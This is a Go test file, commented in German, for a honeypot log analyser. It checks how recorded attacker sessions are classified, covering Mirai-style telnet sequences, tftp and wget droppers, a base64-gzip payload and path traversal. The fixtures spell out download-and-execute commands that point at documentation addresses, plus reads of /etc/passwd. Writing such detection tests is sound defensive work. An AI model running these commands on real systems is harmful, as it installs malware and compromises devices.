package main

// Befunde aus der Prüfung einer echten Instanz (v0.9.3-beta, November 2026). Die Ereignisse
// sind nachgebaut; Adressen stammen aus den Dokumentationsnetzen.

import (
	"bytes"
	"compress/gzip"
	"encoding/base64"
	"slices"
	"strings"
	"testing"
	"time"
)

func sessEv(e *Event, sess string) *Event {
	e.Session = sess
	return e
}

// Cowrie nimmt bei "nach N Versuchen" auch eine HTTP-Kopfzeile als Login an; die übrigen
// Kopfzeilen kommen dann als Befehle. Vorher: Stufe 3 "TELNET-Einbruch".
func TestBefundHTTPAnTelnetKeinEinbruch(t *testing.T) {
	a := attackOf(
		sessEv(loginEv("telnet", "GET / HTTP/1.1", "Host: 203.0.113.1:23", map[string]any{"success": false}), "s1"),
		sessEv(loginEv("telnet", "User-Agent: Mozilla/5.0", "Accept: */*", map[string]any{"success": true}), "s1"),
		sessEv(svcCmd("telnet", "Accept-Encoding: gzip"), "s1"),
		sessEv(svcCmd("telnet", ""), "s1"),
	)
	if a.Stufe != stufeScan || a.Counts["command"] != 0 || len(a.Commands) != 0 || a.Success {
		t.Errorf("Stufe %d, Zähler %v, Befehle %v, Login %v", a.Stufe, a.Counts, a.Commands, a.Success)
	}
	if a.Profile != "Protokoll-Probe" || !hasTag(a, "http_on_raw") {
		t.Errorf("Art %q, Muster %v", a.Profile, a.Tags)
	}
	// echte Befehle in der Schein-Shell bleiben Befehle
	for _, c := range []string{"uname -a", "cat /etc/passwd", "echo a:b", "ls -la /tmp"} {
		if k := eventKind(svcCmd("ssh", c), true); k != kindExec {
			t.Errorf("%q: Art %d", c, k)
		}
	}
}

// Leere Eingabe (nur Enter) hob einen Login auf Stufe 3.
func TestBefundLeereEingabeKeinBefehl(t *testing.T) {
	a := attackOf(sessEv(loginEv("ssh", "root", "root", map[string]any{"success": true}), "s2"), sessEv(svcCmd("ssh", "  "), "s2"))
	if a.Stufe != stufeLogin || a.Counts["command"] != 0 {
		t.Errorf("Stufe %d, Zähler %v", a.Stufe, a.Counts)
	}
	if r := BuildReport("x", []*Event{svcCmd("ssh", "")}, false); len(r.Commands) != 0 {
		t.Errorf("Bericht: %v", r.Commands)
	}
	if c := BuildChain([]*Event{svcCmd("ssh", "")}, false); c != nil && len(c.Nodes) != 0 {
		t.Errorf("Kette: %+v", c.Nodes)
	}
}

// "enable\x00" / "linuxshell\x00": Befehle an der Login-Abfrage, keine Zugangsdaten.
func TestBefundNullbyteAnDerLoginAbfrage(t *testing.T) {
	ev := loginEv("telnet", `enable\x00`, `linuxshell\x00`, nil)
	lines, ok := promptLines(ev)
	if !ok || !slices.Equal(lines, []string{"enable", "linuxshell"}) {
		t.Fatalf("%v %v", lines, ok)
	}
	for _, k := range topKeys(ev) {
		if k[0] == "cred" || k[0] == "username" {
			t.Errorf("Zähltabelle: %v", k)
		}
	}
	a := attackOf(loginEv("telnet", `system\x00`, `shell\x00`, nil))
	if a.Counts["login"] != 0 || a.Counts["prompt"] != 1 || len(a.Creds) != 0 {
		t.Errorf("Zähler %v, Zugangsdaten %v", a.Counts, a.Creds)
	}
	if trimNul(`root\x00\x00 `) != "root" || trimNul("root\x00") != "root" || trimNul(`a\x00b`) != `a\x00b` {
		t.Error("trimNul")
	}
}

// Cowrie: Nullbytes an Telnet-Zugangsdaten und Befehlen entfernen, leere Befehle verwerfen.
func TestBefundCowrieNullbyteUndLeereEingabe(t *testing.T) {
	var got []*Event
	c := NewCowrieTail("x", "s", nil, func(e *Event) { got = append(got, e) })
	ts := `"timestamp":"2026-11-20T10:00:00.000000Z"`
	c.handle([]byte(`{"eventid":"cowrie.session.connect","session":"n1","src_ip":"203.0.113.80","dst_port":23,"protocol":"telnet",` + ts + `}`))
	c.handle([]byte(`{"eventid":"cowrie.login.success","session":"n1","src_ip":"203.0.113.80","username":"admin\\x00","password":"admin\\x00",` + ts + `}`))
	c.handle([]byte(`{"eventid":"cowrie.command.input","session":"n1","src_ip":"203.0.113.80","input":"sh\\x00",` + ts + `}`))
	c.handle([]byte(`{"eventid":"cowrie.command.input","session":"n1","src_ip":"203.0.113.80","input":"",` + ts + `}`))
	if len(got) != 3 {
		t.Fatalf("%d Ereignisse", len(got))
	}
	if got[1].Username != "admin" || got[1].Password != "admin" || dataString(got[2].Data, "input") != "sh" {
		t.Errorf("%q %q %q", got[1].Username, got[1].Password, dataString(got[2].Data, "input"))
	}
}

// Mirai-Telnet-Folge ohne Probe-Applet und die Gafgyt-Kennung als Hex-Echo.
func TestBefundMiraiTelnetFolge(t *testing.T) {
	for _, cmds := range [][]string{
		{"enable", "system", "shell", "sh", "linuxshell", "ping ;sh", "/bin/busybox"},
		{"enable", "system", "shell", "sh", `echo -e "\x47\x41\x59\x46\x47\x54"`},
	} {
		evs := []*Event{sessEv(loginEv("telnet", "admin", "admin", map[string]any{"success": true}), "m1")}
		for _, c := range cmds {
			evs = append(evs, sessEv(svcCmd("telnet", c), "m1"))
		}
		a := attackOf(evs...)
		if !hasTag(a, "iot_botnet") || a.Profile != "IoT-Botnetz (Mirai-Art)" {
			t.Errorf("%v: Muster %v, Art %q", cmds, a.Tags, a.Profile)
		}
		if slices.Contains(a.Mitre, "T1105") { // ohne Nachladen kein Ingress Tool Transfer
			t.Errorf("%v: MITRE %v", cmds, a.Mitre)
		}
	}
	for _, c := range []string{"echo enable", "systemctl status", "ping -c1 203.0.113.1", "busybox ls"} {
		if contains(matchPatterns(c, "cmd"), "iot_botnet") {
			t.Errorf("Fehlalarm %q", c)
		}
	}
	if !contains(matchPatterns("wget http://203.0.113.9/bins/bot.x86_64 -O q", "cmd"), "iot_botnet") {
		t.Error("x86_64")
	}
}

// Laden und Starten in getrennten Befehlen; Nachlade-Adresse aus tftp.
func TestBefundDropperInEinzelschritten(t *testing.T) {
	evs := []*Event{sessEv(loginEv("telnet", "root", "root", map[string]any{"success": true}), "d1")}
	for _, c := range []string{"cd /dev", "rm -f q", "tftp -g -r x86_64 -l q 198.51.100.20", "ls -l q", "chmod 777 q", "./q telnet.x86"} {
		evs = append(evs, sessEv(svcCmd("telnet", c), "d1"))
	}
	a := attackOf(evs...)
	if !hasTag(a, "download_exec") || !slices.Contains(a.Mitre, "T1105") {
		t.Errorf("Muster %v, MITRE %v", a.Tags, a.Mitre)
	}
	if !slices.Contains(a.URLs, "tftp://198.51.100.20/x86_64") {
		t.Errorf("Adressen %v", a.URLs)
	}
	// nur laden, nichts starten: kein Dropper
	b := attackOf(sessEv(loginEv("ssh", "a", "b", map[string]any{"success": true}), "d2"), sessEv(svcCmd("ssh", "wget http://203.0.113.9/index.html"), "d2"), sessEv(svcCmd("ssh", "cat index.html"), "d2"))
	if hasTag(b, "download_exec") {
		t.Errorf("Fehlalarm: %v", b.Tags)
	}
	for in, want := range map[string]string{
		"busybox tftp -r bot.mips -g 198.51.100.21":   "tftp://198.51.100.21/bot.mips",
		"tftp -g -l x -r /a/b 198.51.100.22 69; sh x": "tftp://198.51.100.22/a/b",
		"tftp -g -r x": "",
	} {
		got := tftpURLs(in)
		if want == "" && len(got) != 0 || want != "" && (len(got) != 1 || got[0] != want) {
			t.Errorf("%q: %v", in, got)
		}
	}
}

// Dropper-Adressen, die ein Bot blind an die Login-Abfrage schickt, erscheinen als Nachlade-Adressen.
func TestBefundAdressenAnDerLoginAbfrage(t *testing.T) {
	a := attackOf(loginEv("telnet", "cd /tmp || cd /var/run; wget http://203.0.113.30/main_mips -O m; chmod 777 m; ./m", "", nil))
	if !slices.Contains(a.URLs, "http://203.0.113.30/main_mips") || a.Stufe != stufeVersuch {
		t.Errorf("Adressen %v, Stufe %d", a.URLs, a.Stufe)
	}
}

// URL-Kodierung in Web-Pfaden ist keine Verschleierung; /etc/passwd ist kein Befehl "passwd".
func TestBefundURLKodierungKeineVerschleierung(t *testing.T) {
	ids := matchAll("/v1.41/containers/abc/archive?path=%2Fusr%2Fbin%2F", "web", revealHidden("/v1.41/containers/abc/archive?path=%2Fusr%2Fbin%2F"))
	if contains(ids, "obfuscation") {
		t.Errorf("Docker-Archiv: %v", ids)
	}
	p := "/..%2F..%2F..%2F..%2Fetc%2Fpasswd"
	ids = matchAll(p, "web", revealHidden(p))
	if !contains(ids, "traversal") || contains(ids, "account") || contains(ids, "obfuscation") {
		t.Errorf("Traversal: %v", ids)
	}
	// Base64 im Parameter bleibt Verschleierung und wird als Befehl geprüft
	b := base64.StdEncoding.EncodeToString([]byte("cd /tmp; wget http://203.0.113.9/x.sh; chmod +x x.sh; ./x.sh"))
	p = "/cgi-bin/x?c=" + b
	ids = matchAll(p, "web", revealHidden(p))
	if !contains(ids, "obfuscation") || !contains(ids, "download_exec") {
		t.Errorf("Base64: %v", ids)
	}
}

// Base64 aus gzip ("echo H4sI… | base64 -d | gunzip | sh") wird entpackt.
func TestBefundBase64Gzip(t *testing.T) {
	var buf bytes.Buffer
	zw := gzip.NewWriter(&buf)
	zw.Write([]byte("#!/bin/sh\ncd /tmp; curl -fsSL http://198.51.100.40/i.sh -o i.sh; chmod +x i.sh; ./i.sh\n" + strings.Repeat("# Fuelltext\n", 40)))
	zw.Close()
	enc := base64.StdEncoding.EncodeToString(buf.Bytes())
	cmd := "create image=alpine cmd=chroot /mnt/ /bin/sh -c echo " + enc + " | base64 -d | gunzip | sh"
	a := attackOf(evAt(time.Time{}, "command", "dockerapi", "", 2375, map[string]any{"input": cmd}))
	if !hasTag(a, "obfuscation") || !hasTag(a, "download_exec") || !slices.Contains(a.URLs, "http://198.51.100.40/i.sh") {
		t.Errorf("Muster %v, Adressen %v, entschlüsselt %d", a.Tags, a.URLs, len(a.Decoded))
	}
	// abgeschnitten (Befehl gekürzt): was lesbar war, zählt
	cut := enc[:len(enc)/2]
	cut = cut[:len(cut)/4*4]
	if r := revealHidden("echo " + cut); len(r) == 0 || !strings.Contains(r[0], "curl -fsSL") {
		t.Errorf("gekürzt: %v", r)
	}
	if _, ok := gunzipSmall([]byte("kein gzip, nur Text")); ok {
		t.Error("gunzip ohne gzip")
	}
}

// SSH-Weiterleitungen sind keine Web-Anfragen; Datei-Uploads per SCP tragen ein Merkmal.
func TestBefundWeiterleitungUndUpload(t *testing.T) {
	fw := func(to string) *Event {
		return sessEv(evAt(time.Time{}, "request", "ssh", "", 22, map[string]any{"forward_to": to}), "f1")
	}
	a := attackOf(sessEv(loginEv("ssh", "admin", "admin", map[string]any{"success": true}), "f1"), fw("198.51.100.50:80"), fw("198.51.100.51:80"), fw("198.51.100.50:80"))
	if a.Counts["request"] != 0 || a.Counts["forward"] != 3 || len(a.Paths) != 0 {
		t.Errorf("Zähler %v, Pfade %v", a.Counts, a.Paths)
	}
	if !slices.Equal(a.Forwards, []string{"198.51.100.50:80", "198.51.100.51:80"}) || !hasTag(a, "ssh_tunnel") || !slices.Contains(a.Mitre, "T1090") {
		t.Errorf("Ziele %v, Muster %v, MITRE %v", a.Forwards, a.Tags, a.Mitre)
	}
	if a.Profile != "SSH-Brute-Force" || a.Stufe != stufeLogin {
		t.Errorf("Art %q, Stufe %d", a.Profile, a.Stufe)
	}
	if hourlyType(fw("198.51.100.50:80")) != "forward" || hourlyType(evAt(time.Time{}, "request", "http", "", 80, map[string]any{"path": "/"})) != "request" {
		t.Error("hourlyType")
	}
	up := attackOf(sessEv(loginEv("ssh", "root", "x", map[string]any{"success": true}), "u1"),
		sessEv(evAt(time.Time{}, "download", "ssh", "", 22, map[string]any{"filename": "sshd", "sha256": strings.Repeat("ab", 32), "upload": true}), "u1"))
	if up.Stufe != stufeDownload || !hasTag(up, "file_upload") || !slices.Contains(up.Mitre, "T1105") {
		t.Errorf("Upload: Stufe %d, Muster %v, MITRE %v", up.Stufe, up.Tags, up.Mitre)
	}
}
